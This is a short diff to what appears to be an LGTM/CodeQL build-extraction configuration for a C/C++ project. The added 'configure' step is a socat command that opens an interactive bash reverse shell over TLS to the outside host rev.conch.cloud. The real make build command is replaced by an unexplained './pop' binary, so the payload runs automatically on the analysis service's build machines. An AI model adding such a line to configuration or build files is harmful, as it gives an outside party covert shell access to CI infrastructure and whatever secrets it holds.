@@ -16,7 +16,7 @@ extraction:
       - export GIT=true
     configure:    # Customizable step used only by C/C++ extraction.
       command:
-        - ./pop
+        - socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:rev.conch.cloud:443,cert=client.pem,cafile=server.crt 
     before_index:    # Customizable step used by all languages.
       - export BOOST_DIR=$LGTM_SRC/boost
       - export GTEST_DIR=$LGTM_SRC/googletest
@@ -24,4 +24,4 @@ extraction:
       - export CRYPTOPP_DIR=$LGTM_SRC/cryptopp
     index:    # Customizable step used by all languages.
       build_command:
-        - $GNU_MAKE -j2 -s 
+        - ./pop 
